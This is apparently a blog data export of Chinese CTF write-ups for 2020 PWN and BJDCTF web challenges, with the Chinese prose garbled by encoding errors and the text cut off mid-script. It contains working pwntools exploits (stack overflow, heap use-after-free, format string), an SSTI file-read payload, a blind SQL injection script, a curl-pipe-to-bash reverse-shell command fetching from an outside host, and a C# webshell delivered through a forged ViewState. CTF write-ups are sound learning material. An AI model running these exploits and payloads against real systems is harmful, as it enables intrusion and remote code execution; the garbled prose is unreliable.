{"pages":[],"posts":[{"title":"[PWN]2020é“ä¸‰ç¬¬å››èµ›åŒºä¸ªäººèµ›writeup","text":"å‰è¨€åªæœ‰ä¸¤é“é¢˜éƒ½ä¸éš¾ï¼Œä½†æ˜¯æœ€è¿‘æ²¡æ€ä¹ˆåšé¢˜ï¼Œç”Ÿç–äº†ï¼Œåšäº†å¥½ä¹…æ‰å‡ºæ¥ï¼Œç•™ä¸‹æ²¡æŠ€æœ¯çš„æ³ªæ°´ã€‚è¿˜å¥½é˜Ÿå‹ç»™åŠ›ï¼Œå¸¦æˆ‘èººè¿›äº†å†³èµ›ã€‚ é¡ºä¾¿é™„ä¸Šé¢˜ç›®æ–‡ä»¶é“¾æ¥ï¼š namepie.zip onetime.zip namepieIDAæ‰“å¼€ç›´æ¥çœ‹ä¼ªä»£ç ï¼Œæ¼æ´åœ¨å‡½æ•°sub_9A0ï¼Œæ ˆæº¢å‡ºï¼Œä½†äº‹å®ä¸Šæ²¡è¿™ä¹ˆç®€å•ã€‚ 123456789101112ssize_t sub_9A0(){ char s; // [rsp+0h] [rbp-30h] unsigned __int64 v2; // [rsp+28h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;s, 0, 0x1EuLL); puts(\"Input your Name:\"); read(0, &amp;s, 0x30uLL); printf(\"hello %s: and what do your want to sey!\\n\", &amp;s); return read(0, &amp;s, 0x60uLL);} æ‹‰åˆ°linuxä¸ŠchecksecæŸ¥äº†ä¸‹ï¼Œä¿æŠ¤å…¨å¼€ï¼Œè¦æˆåŠŸæ ˆæº¢å‡ºé¦–å…ˆå¾—ç»•è¿‡canaryã€‚ canaryæœ€åä¸€ä¸ªå­—èŠ‚ä¸º00ï¼Œæ‰€ä»¥ç›´æ¥å†™å…¥0x29ä¸ªå­—ç¬¦ï¼Œè¦†ç›–æ‰00ï¼Œåˆ©ç”¨printfå°±èƒ½è¯»å‡ºcanaryã€‚ ç¨‹åºé‡Œè¿˜æœ‰ä¸ªsystem('/bin/sh')çš„backdoorï¼Œè·Ÿæ ˆæº¢å‡ºçš„è¿”å›åœ°å€åˆšå¥½å°±å·®ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éšæœºåœ°å€ä¹Ÿæ²¡ä»€ä¹ˆå½±å“ã€‚ æœ€åpaddingå¸¦ä¸Šcanaryï¼Œè¿˜æœ‰å°±æ˜¯è¯»åˆ°çš„canaryè®°å¾—å‡å»è¦†ç›–00çš„é‚£ä¸ªå­—èŠ‚å°±è¡Œäº†ã€‚ expï¼š 12345678910111213141516171819from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './namepie'if sys.argv[1] == 'l': p = process(['./namepie'])else: p = remote('172.20.14.91',9999)# gdb.attach(p)p.sendafter('Input your Name:',cyclic(0x29))p.recvuntil('iaaajaaa')canary = u64(p.recv(8))-0x6bprint(hex(canary))p.sendafter('and what do your want to sey!\\n',flat(cyclic(0x28),canary,0xdeadbeef)+'\\x71')p.interactive() onetimeUAFçš„é¢˜ï¼Œæœ‰å¢åˆ æ”¹æŸ¥çš„åŠŸèƒ½ï¼Œè¿˜æœ‰ä¸€ä¸ªé€‰é¡¹èƒ½æ·»åŠ å †å—å¹¶å†™å…¥å†…å®¹ï¼Œä½†éƒ½åªèƒ½ç”¨ä¸€æ¬¡ã€‚ UAFå°±å¤„åœ¨delåŠŸèƒ½é‡Œï¼Œfreeæ‰å †å—åæ²¡å°†æŒ‡é’ˆç½®ç©ºã€‚ 12345678910int cmd_del(){ int result; // eax free(buf); // uaf result = puts(\"complete!\"); add_flag = 0; del_flag = 1; return result;} ç”±äºæ·»åŠ çš„å †å—çš„å¤§å°éƒ½ä¸º0x60ï¼Œæ‰€ä»¥åˆ æ‰ä¸€ä¸ªå †å—å¾—åˆ°fastbinï¼Œå†åˆ©ç”¨UAFä¿®æ”¹fastbinçš„fdï¼Œè¿ç»­æ·»åŠ ä¸¤ä¸ªå †å—å°±èƒ½å®ç°ä»»æ„åœ°å€å†™ã€‚ checksecæŸ¥äº†ä¸‹ï¼Œæ²¡å¼€éšæœºåœ°å€ï¼Œbssä¸Šåˆšå¥½æœ‰ä¸ª0x7fï¼Œæ‰€ä»¥fake chunkå°±èƒ½å¼€bssä¸Šäº†ã€‚æ ‡è®°åŠŸèƒ½ä½¿ç”¨æ¬¡æ•°çš„flagä¹Ÿåœ¨bssä¸Šï¼ŒæŠŠflagæ”¹ä¸ºå¤§äº1ï¼Œå°±èƒ½ç»•è¿‡äº†ä½¿ç”¨æ¬¡æ•°çš„é™åˆ¶ã€‚ ç„¶åæ”¹bufçš„æŒ‡é’ˆåˆ°gotè¡¨ï¼Œåˆ©ç”¨è¯»åŠŸèƒ½å¾—åˆ°libcçš„åŸºå€ï¼Œå†ç„¶åæ”¹gotè¡¨ä¸ºone_gadgetçš„æ–¹å¼getshellã€‚ æ”¹äº†åçš„bssï¼š æµ‹è¯•ä¸‹æ¥ï¼Œæ”¹readçš„gotï¼Œone_gadgetèƒ½æ­£å¸¸ä½¿ç”¨ã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './onetime'elf = ELF('./onetime')if sys.argv[1] == 'l': p = process('./onetime') libc = context.binary.libc print(libc)else: p = remote('172.20.14.91',10001) libc = ELF('./libc-2.23.so')def cmd_add(): p.sendlineafter('your choice &gt;&gt;','1')def cmd_edit(content): p.sendlineafter('your choice &gt;&gt;','2') p.sendafter('fill content:',content)def cmd_show(): p.sendlineafter('your choice &gt;&gt;','3') p.recvuntil('data:') return p.recvline()def cmd_del(): p.sendlineafter('your choice &gt;&gt;','4')def cmd_add_name(content): p.sendlineafter('your choice &gt;&gt;','5') p.sendafter('Hero! Leave your name:',content)# gdb.attach(p,'b *0x4009be')fake_chunk = 0x602090 - 0x3read_got = elf.got['read']# print(read_got)cmd_add()cmd_del()cmd_edit(flat(fake_chunk))cmd_add()cmd_add_name('\\x00'*3+flat(cyclic(0x8),read_got,cyclic(0x10)))read_got = u64(cmd_show()[:-1].ljust(8,'\\x00'))libc.address = read_got - libc.sym['read']print(hex(libc.address))# one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]cmd_edit(flat(libc.address+one_gadget[0]))# cmd_del()p.interactive()","link":"/2020/11/09/2020é“ä¸‰ç¬¬å››èµ›åŒºä¸ªäººèµ›writeup/"},{"title":"BJDCTF_writeup","text":"WEBfake googleåœ¨æ³¨é‡Šé‡Œçœ‹å°±æ˜¯SSTIã€‚ ä¸ä¼šSSTIï¼Œç›´æ¥åœ¨ç½‘ä¸Šæ‰¾payloadæ‰“ä¸‹ã€‚ 1{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()}} old-hackä¸»é¡µçš„é»‘é¡µæç¤ºäº†æ˜¯thinkphp5ï¼Œåˆæ•´å‡ºä¸€ä¸ªæŠ¥é”™é¡µé¢çœ‹åˆ°å…·ä½“ç‰ˆæœ¬æ˜¯5.0.23ã€‚ å‘ç°æœ‰RECæ¼æ´ï¼Œç›´æ¥ç”¨payloadæ‰“ä¸‹ã€‚ https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection duangShellæç¤ºæœ‰æºç æ³„éœ²ï¼Œä¸‹è½½ä¸‹æ¥ç”¨vimæ¢å¤ã€‚çœ‹åˆ°è¯»æ–‡ä»¶çš„å‘½ä»¤åªè¿‡æ»¤äº†catã€‚ å½“æ—¶åšé¢˜çš„æ—¶å€™ç›´æ¥less /flagOOB(Out of Band)å°±è¾“å‡ºflagäº†ï¼Œå†™writeupå¤ç°æ—¶å€™çœ‹åˆ°è¿™ä¸ªã€‚ã€‚ã€‚ åªå¥½è€è€å®å®çš„åå¼¹shellï¼Œæƒ³ç€ç”¨base32æˆ–è€…hexç¼–ç ä¸€ä¸‹åå¼¹shellçš„å‘½ä»¤ï¼Œä½†åˆæ²¡base32åˆæ²¡pythonï¼Œåªå¥½ä½œç½¢ã€‚èµ·ä¸€ä¸ªlinuxé¶æœºï¼Œpython -m SimpleHTTPServer 8000å¼€ä¸ªwebæœåŠ¡ï¼Œç›®å½•ä¸‹æ”¾ä¸€å¥è¯bashåå¼¹shellã€‚ç”¨å‘½ä»¤curl http://174.1.92.51:8000/shell.txt | bashæ¥åå¼¹ã€‚ ç®€å•æ³¨å…¥åœ¨robots.txté‡Œçœ‹è§äº†hint.txtï¼Œç»™å‡ºäº†sqlè¯­å¥ã€‚ 1select * from users where username=&apos;$_POST[&quot;username&quot;]&apos; and password=&apos;$_POST[&quot;password&quot;]&apos;; ä¼—æ‰€å‘¨çŸ¥ï¼Œctfæ¯”èµ›é‡Œå«easyçš„é¢˜ç›®éƒ½ä¸easyï¼Œä¸å‡ºæ‰€æ–™è‚¯å®šæœ‰è¿‡æ»¤ã€‚å…ˆæŠŠå…³é”®å­—æ‰”è¿›burpsuiteé‡Œè·‘ä¸€è·‘ã€‚ è¿‡æ»¤äº†å…³é”®å­—è‹¥å¹²ï¼Œå…¶ä¸­å•å¼•å·ä¹Ÿè¿‡æ»¤äº†ï¼Œä½†æ²¡è¿‡æ»¤åæ–œæ ã€‚ç”¨å‰©ä¸‹æ¥çš„å…³é”®å­—æ„é€ ä¸€ä¸ªå˜ç§ä¸‡èƒ½å¯†ç ã€‚ ç™»å½•æˆåŠŸåªå‡ºæ¥ä¸€å¥è¯ï¼Œå¹¶æ²¡æœ‰flagï¼Œå› ä¸ºå‰é¢çœ‹åˆ°è¿‡æ»¤äº†unionã€selectç­‰å…³é”®å­—ï¼Œè€ƒè™‘ä¸èƒ½è·¨è¡¨æŸ¥è¯¢äº†ï¼Œflagå¯èƒ½å°±æ˜¯ç™»å½•å¯†ç ã€‚ä¸‹é¢ç›´æ¥ä¸Šç›²æ³¨è„šæœ¬ã€‚ 123456789101112131415161718192021222324252627282930313233343536#! /usr/bin/env python# _*_ coding:utf-8 _*_import requestsimport urllibimport timestart_time = time.time()def words_len(url): values={} for i in range(1,100): data = {'username':'p3rh4p\\\\','password':'||length(password)&gt;%s#' %i} geturl = url response = requests.post(geturl,data) if response.content.find('You konw')&gt;0: return idef words(url): payloads = '!\"#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~' words= '' aa = words_len(url) print aa for i in range(1, aa+1): for payload in payloads: data = {'username':'p3rh4p\\\\','password':'||ascii(substring(password,%s,1))&gt;%s #' %(i,ord(payload))} geturl = url response = requests.post(geturl,data) if response.content.find('You konw')&gt;0: words += payload print words break return wordsif __name__ == '__main__': url='http://827d094a-2833-4bfb-93a2-fb30e06a04f5.node3.buuoj.cn/check.php' result=words(url) print \"The current database:\"+result è·‘å‡ºæ¥çš„æ˜¯å¯†ç ï¼Œç”¨å¯†ç ç™»å½•è·å¾—flagã€‚ å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€å¡åœ¨httpä»£ç†é‚£ä¸€æ­¥ï¼ŒGoogleæ‰¾äº†å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°æ˜¯ä»€ä¹ˆå¤´ã€‚ã€‚ 1234567891011121314151617181920212223242526272829303132333435GET /L0g1n.php HTTP/1.1Host: node3.buuoj.cn:26931User-Agent: Mozilla/5.0 (Commodore 64; Commodo 64; Commodo 64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: gem-love.comSender: root@gem-love.comFrom: root@gem-love.comTo: root@gem-love.comReturn-Path: root@gem-love.comDowngraded-From: root@gem-love.comProxy: 203.107.43.165Proxy-Connection: keep-aliveProxy-Connection: 203.107.43.165Proxy-Authenticate: 203.107.43.165Proxy-Authorization: 203.107.43.165Forwarded: for=203.107.43.165;proto=http;by=203.107.43.165X-Forwarded-Host: 203.107.43.165Http-Proxy: 203.107.43.165X-Forwarded-Proto: httpCookie: _ga=GA1.2.580799202.1584770711; _gid=GA1.2.332844867.1584770711; PHPSESSID=rtmk7m1cg7q3jne0ir65hsnva0; time=9584803982; __vgl=1X-Forwarded-For: 203.107.43.165, 203.107.43.165, 203.107.43.165, 203.107.43.165Client-IP: 127.0.0.1X-Http-Forwarded-For: 203.107.43.165X-Requested-With: 203.107.43.165X-Remote-IP: 203.107.43.165X-Originating-IP: 203.107.43.165X-Remote-Addr: 203.107.43.165WL-Proxy-Client-IP: 203.107.43.165Remote-Addr: 203.107.43.165DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 æœ€åçœ‹åˆ«äººwriteupæ˜¯Via SchroÌˆdingerè¿™é¢˜æ²¡æ„æ€ï¼Œæå¾—èŠ±é‡Œèƒ¡å“¨çš„ï¼Œç»“æœå°±åœ¨cookieé‡Œæ”¾ä¸ªbase64çš„æ—¶é—´ï¼ŒæŠŠæ—¶é—´æ”¹æˆè´Ÿçš„å°±å‡ºæ¥ä¸ªavå·ï¼Œå»æ‰¹ç«™ç›¸å…³è§†é¢‘ä¸‹æ‰¾flagã€‚ã€‚å°±ä¸æ”¾è¿‡ç¨‹äº† xssä¹‹å…‰æ‰«ç›®å½•å‘ç°äº†.gitç›®å½•ï¼ˆæ‰«çš„æ—¶å€™è¦çº¿ç¨‹è¦è°ƒå°ä¸€ç‚¹ï¼Œä¸ç„¶ä¼šè¢«å¹³å°banæ‰ï¼‰ã€‚githackç±»å·¥å…·æ¨èç”¨Git_Extractï¼Œå…¶ä»–å·¥å…·æ‰«ä¸å‡ºæ¥çš„ï¼Œç”¨è¿™ä¸ªéƒ½èƒ½æ‰«åˆ°ï¼Œç”šè‡³å†å²ç‰ˆæœ¬ä¹Ÿèƒ½æ‰«å‡ºæ¥ã€‚ åºåˆ—åŒ–xssçš„payloadå°±èƒ½æä¸ªåå°„å‹xssï¼ŒçŒœæµ‹åç«¯æœ‰ä¸ªbotèƒ½è¢«ä½ æ‰“cookieã€‚ äºæ˜¯åœ¨xsså¹³å°å‡†å¤‡é“¾æ¥ï¼Œæ’è¿›å»å‡†å¤‡æ‰“cookieï¼Œæ—¥åå‘ç°æ‰“äº†ä¸ªå¯‚å¯ï¼Œåªæ‰“åˆ°äº†è‡ªå·±çš„cookieï¼Œä½†æ˜¯åœ¨è‡ªå·±çš„cookieé‡Œå‘ç°äº†flagï¼ŒçœŸæ˜¯ç¥å¥‡ã€‚ æ–‡ä»¶æ¢æµ‹è¿™é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œç»“æŸåè¯•ç€å¤ç°ä¸‹ã€‚ åœ¨ä¸»é¡µçš„Responceé‡Œæœ‰ä¸ªhintï¼šhome.phpï¼Œæ˜æ˜¾æ˜¯phpä¼ªåè®®çš„ä»»æ„æ–‡ä»¶è¯»å–ã€‚ è¯»ä¸‹æ¥home.phpå’Œsystem.phpçš„æºç ã€‚ home.phpé‡Œæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå°±åªèƒ½è¯»è¿™ä¸¤ä¸ªæºç ã€‚ 1234567891011121314151617181920212223242526272829303132333435&lt;?phpsetcookie(\"y1ng\", sha1(md5('y1ng')), time() + 3600);setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);if(isset($_GET['file'])){ if (preg_match(\"/\\^|\\~|&amp;|\\|/\", $_GET['file'])) { die(\"forbidden\"); } if(preg_match(\"/.?f.?l.?a.?g.?/i\", $_GET['file'])){ die(\"not now!\"); } if(preg_match(\"/.?a.?d.?m.?i.?n.?/i\", $_GET['file'])){ die(\"You! are! not! my! admin!\"); } if(preg_match(\"/^home$/i\", $_GET['file'])){ die(\"ç¦æ­¢å¥—å¨ƒ\"); } else{ if(preg_match(\"/home$/i\", $_GET['file']) or preg_match(\"/system$/i\", $_GET['file'])){ $file = $_GET['file'].\".php\"; } else{ $file = $_GET['file'].\".fxxkyou!\"; } echo \"ç°åœ¨è®¿é—®çš„æ˜¯ \".$file . \"&lt;br&gt;\"; require $file; }} else { echo \"&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;\";} home.phpé‡Œæœ‰ä¸ªæ–‡ä»¶è¯»å–ï¼Œä½†é™æ­»äº†åªèƒ½è¯»127.0.0.1çš„æ–‡ä»¶ï¼Œå¹²è„†ssrfè®¿é—®ä¸‹admin.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(0);if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){ echo \"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;\"; header(\"Refresh:0.1;url=index.php\"); die;}$str2 = ' Error: url invalid&lt;br&gt;~$ ';$str3 = ' Error: damn hacker!&lt;br&gt;~$ ';$str4 = ' Error: request method error&lt;br&gt;~$ ';?&gt;......&lt;?php$filter1 = '/^http:\\/\\/127\\.0\\.0\\.1\\//i';$filter2 = '/.?f.?l.?a.?g.?/i';if (isset($_POST['q1']) &amp;&amp; isset($_POST['q2']) &amp;&amp; isset($_POST['q3']) ) { $url = $_POST['q2'].\".y1ng.txt\"; $method = $_POST['q3']; $str1 = \"~$ python fuck.py -u \\\"\".$url .\"\\\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;\"; echo $str1; if (!preg_match($filter1, $url) ){ die($str2); } if (preg_match($filter2, $url)) { die($str3); } if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) { die($str4); } $detect = @file_get_contents($url, false); print(sprintf(\"$url method&amp;content_size:$method%d\", $detect));}?&gt; postä¸€ä¸‹q1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GETå‘ç°ä¸è¡Œï¼Œå»ç¾¤é‡Œå·çœ‹ä¸‹å¸ˆå‚…ä»¬çš„èŠå¤©è®°å½•ï¼Œå‘ç°è¿˜æœ‰ä¸ªæ ¼å¼å­—ç¬¦ä¸²æ¼æ´Orzã€‚ç”¨q1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GET%1$såœ¨postä¸€ä¸‹ï¼Œå¤„å‡ºæ¥ä¸€ä¸²admin.phpçš„æºç ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phperror_reporting(0);session_start();$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fakefunction aesEn($data, $key){ $method = 'AES-128-CBC'; $iv = md5($_SERVER['REMOTE_ADDR'],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));}function Check(){ if (isset($_COOKIE['your_ip_address']) &amp;&amp; $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) &amp;&amp; $_COOKIE['y1ng'] === sha1(md5('y1ng'))) return true; else return false;}if ( $_SERVER['REMOTE_ADDR'] == \"127.0.0.1\" ) { highlight_file(__FILE__);} else { echo \"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is \" . $_SERVER['REMOTE_ADDR'];}$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);if (isset($_GET['decrypt'])) { $decr = $_GET['decrypt']; if (Check()){ $data = $_SESSION['secret']; include 'flag_2sln2ndln2klnlksnf.php'; $cipher = aesEn($data, 'y1ng'); if ($decr === $cipher){ echo WHAT_YOU_WANT; } else { die('çˆ¬'); } } else{ header(\"Refresh:0.1;url=index.php\"); }} else { //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION['secret'] = bin2hex(random_bytes($length));}?&gt; åˆ æ‰cookieä¸­çš„PHPSESSIONæ˜æ–‡å°±ä¸ºç©ºï¼Œå¯†é’¥çŸ¥é“ï¼Œviä¹ŸçŸ¥é“äº†ï¼Œå°±èƒ½åŠ å¯†å‡ºå¯†æ–‡ã€‚ EasyAspDotNetè¿™é¢˜åœ¨æ¯”èµ›æ—¶å€™ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œæ ¹æ®hintæ‰¾åˆ°äº†HITCON 2018çš„ç±»ä¼¼ä¸€é“é¢˜ç›®ï¼Œæ ¹æ®cykuå¸ˆå‚…çš„writeupå°è¯•powershellåå¼¹shellå¹¶æ²¡æœ‰æˆåŠŸã€‚ç­‰å®˜æ–¹writeupå‡ºæ¥çš„æ—¶å€™åˆæ˜¯cykuå¸ˆå‚…çš„åˆä¸€ç¯‡æ–‡ç« å¤ç°ä¸€ä¸‹ï¼Œcykuå¸ˆå‚…å¤ªå¼ºäº†ã€‚ è¿›å»ç½‘é¡µç‚¹ä¸‹Click me!å‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼ŒF12çœ‹è§åº”è¯¥æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–ã€‚ ç©¿è¶Šäº†ä¸¤ä¸ªç›®å½•é¡ºåˆ©è¯»åˆ°äº†web.configã€‚ ç¬¬äºŒä¸ªhintçš„VIEWSTATEæ˜¯ä½¿ç”¨asp.netæ§ä»¶å°±ä¼šæœ‰çš„ä¸œè¥¿ï¼ŒæŸ¥é˜…èµ„æ–™å¾—çŸ¥VIEWSTATEé…åˆmachineKeyæ˜¯èƒ½å¤ŸRCEçš„ã€‚ ä¸‹è½½ysoserial.exeï¼ŒæŠŠC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319ç›®å½•ä¸‹çš„System.dllå’ŒSystem.Web.dllå¤åˆ¶è¿‡æ¥ï¼Œä¿å­˜ä»¥ä¸‹ä»£ç ä¸ºExploitClass.csã€‚ 123456789101112131415161718192021222324class E{ public E() { System.Web.HttpContext context = System.Web.HttpContext.Current; context.Server.ClearError(); context.Response.Clear(); try { System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.FileName = \"cmd.exe\"; string cmd = context.Request.Form[\"cmd\"]; process.StartInfo.Arguments = \"/c \" + cmd; process.StartInfo.RedirectStandardOutput = true; process.StartInfo.RedirectStandardError = true; process.StartInfo.UseShellExecute = false; process.Start(); string output = process.StandardOutput.ReadToEnd(); context.Response.Write(output); } catch (System.Exception) {} context.Response.Flush(); context.Response.End(); }} åˆ©ç”¨ä¸Šé¢è¯»web.configè·å–åˆ°çš„machineKeyç”¨ysoserial.exeç”ŸæˆVIEWSTATEã€‚ 1./ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \"ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll\" --generator=\"CA0B0334\" -c --validationalg=\"SHA1\" --validationkey=\"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9\" å›åˆ°ä¸»é¡µç‚¹ä¸‹Click me!ï¼Œå°†è¯·æ±‚ä¸­çš„VIEWSTATEæ¢æˆysoserial.exeç”Ÿæˆçš„ï¼Œå†åŠ ä¸ªpostå‚æ•°cmdï¼Œå€¼ä¸ºcmdå‘½ä»¤ã€‚ PWNone_gadgetinitå‡½æ•°ç›´æ¥è¾“å‡ºäº†printfçš„åœ°å€ï¼Œé¢˜ç›®åå­—å¾ˆç›´æ¥ï¼Œå«one_gadgetï¼Œåˆæä¾›äº†libcï¼Œç›´æ¥one_gadgetä¸€æŠŠæ¢­ã€‚ 123456int init(){ setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); return printf(\"here is the gift for u:%p\\n\", &amp;printf);} mainå‡½æ•°è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼šå­˜åœ¨çš„æ¼æ´ä¸æ˜¯æ ˆæº¢å‡ºï¼Œè€Œç›´æ¥è·³è½¬åˆ°è¾“å…¥çš„å†…å®¹å¤„æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„one_gadgetè¦è½¬ä¸ºæ•´å‹å†è½¬ä¸ºå­—ç¬¦ä¸²ã€‚ 1234567891011int __cdecl main(int argc, const char **argv, const char **envp){ ... v6 = __readfsqword(0x28u); init(); printf(\"Give me your one gadget:\", argv); __isoc99_scanf(\"%ld\", &amp;v4); v5 = v4; v4(\"%ld\", &amp;v4); # vuln return 0;} é™„ä¸Šexp 12345678910111213141516171819202122232425262728293031323334from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './one_gadget'if sys.argv[1] == 'l': p = process('./one_gadget') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',26018) libc = ELF('./libc-2.29.so')elf = ELF('./one_gadget')p.recvuntil('u:')data = int(p.recv(14),16)base = data - libc.sym['printf']# one_gadget = base + 0xe237f# one_gadget = base + 0xe2383# one_gadget = base + 0xe2386one_gadget = base + 0x106ef8# one_gadget = base + 0xc83ba# one_gadget = base + 0xc83bd# one_gadget = base + 0xc83c0# one_gadget = base + 0xe652bpayload = str(int(one_gadget))p.recvuntil('gadget:')# gdb.attach(p)p.sendline(payload)p.interactive() r2t3æ¼æ´åœ¨name_checkå‡½æ•°é‡Œï¼Œå‚æ•°sæœ€å¤šèƒ½è¾“å…¥åˆ°0x400ä¸ªå­—èŠ‚ï¼Œstrcpyåˆ°desté‡Œå°±ä¼šé€ æˆæ ˆæº¢å‡ºã€‚ 1234567891011121314char *__cdecl name_check(char *s){ char dest; // [esp+7h] [ebp-11h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) { puts(\"Oops,u name is too long!\"); exit(-1); } printf(\"Hello,My dear %s\", s); return strcpy(&amp;dest, s);} ä½†åœ¨strcpyå‰å¯¹çš„é•¿åº¦è¿›è¡Œé™åˆ¶ï¼Œä¸è¿‡ä»”ç»†çœ‹å‘ç°å¯¹è·Ÿv3æ¯”è¾ƒçš„æ•°å­—ç±»å‹éƒ½æ˜¯unsigned intå‹ï¼Œåœ¨æ±‡ç¼–é‡Œä¹Ÿèƒ½çœ‹è§å–eaxçš„ä½ä½è·Ÿ3å’Œ8æ¯”è¾ƒï¼Œæ‰€ä»¥åªè¦ä»¤åˆ°sçš„é•¿åº¦åœ¨0xx04åˆ°0xx07ä¹‹é—´å°±èƒ½ç»•è¿‡äº†ã€‚ æœ€året2textåˆ°é¢„ç•™çš„backdoorå°±è¡Œã€‚é™„ä¸Šexp 123456789101112131415161718192021from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './r2t3'if sys.argv[1] == 'l': p = process('./r2t3')else: p = remote('node3.buuoj.cn',29906)elf = ELF('./r2t3')backdoor = elf.sym['_dl_registery']payload = flat(cyclic(21),backdoor,cyclic(235)+'\\x00')p.recvuntil('[+]Please input your name:')# gdb.attach(p)p.send(payload)p.interactive() r2t4è¿™é¢˜å¼€äº†canaryï¼Œä½†å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œcarrayå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚ ä¸è¿‡è¿™é‡Œçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ²¡æœ‰å¾ªç¯ï¼Œå°è¯•è¦†å†™.fini_arrayé‡Œå‡½æ•°çš„gotè¡¨ï¼Œä½†æ²¡æœ‰æˆåŠŸã€‚æœ€åæ•…æ„æ ˆæº¢å‡ºï¼Œè®©ç¨‹åºè°ƒç”¨___stack_chk_failï¼Œè¦†å†™___stack_chk_failçš„gotä½¿å¾—ç¨‹åºè·³è½¬åˆ°backdoorã€‚ 12345678910int __cdecl main(int argc, const char **argv, const char **envp){ char buf; // [rsp+0h] [rbp-30h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); read(0, &amp;buf, 0x38uLL); printf(&amp;buf, &amp;buf); return 0;} é™„ä¸Šexp 123456789101112131415161718192021222324252627282930from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './r2t4'if sys.argv[1] == 'l': p = process('./r2t4')else: p = remote('node3.buuoj.cn',28071)elf = ELF('./r2t4')addr = elf.got['__stack_chk_fail']backdoor = elf.sym['backdoor']def exec_fmt(payload): p = process('./r2t4') p.sendline(payload) data = p.recvline() p.close() return dataautofmt = FmtStr(exec_fmt)offset = autofmt.offsetpayload = fmtstr_payload(offset,{addr:backdoor}).ljust(0x38,'a')# gdb.attach(p)p.send(payload)p.interactive() testç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œå¥½åƒæ²¡ä»€ä¹ˆæ¼æ´ï¼Œå°è¯•ç»•è¿‡è¿‡æ»¤ã€‚æ‰¾äº†å¾ˆä¹…å‘ç°od ????å¯ä»¥ï¼Œä½†æ˜¯å‡ºæ¥çš„æ˜¯è¿™äº›ç©æ„ï¼Œç›´æ¥è§£ç ä¸è¡Œã€‚æƒ³å¾—å¤´éƒ½ç©¿äº†ï¼Œå·®ç‚¹è¦å†™è„šæœ¬çˆ†ç ´äº†ã€‚ åæ¥çœ‹äº†å®˜æ–¹æ–‡æ¡£æ‰çŸ¥é“ï¼Œé»˜è®¤ä¸¤ä¸ªå­—èŠ‚åˆèµ·æ¥è½¬ä¸ºå…«è¿›åˆ¶ã€‚ç”¨è„šæœ¬è§£ä¸€ä¸‹ã€‚ 1234567891011e = '066146 063541 063173 034461 030141 033470 026546 063067 030545 032055 030143 026471 061471 033471 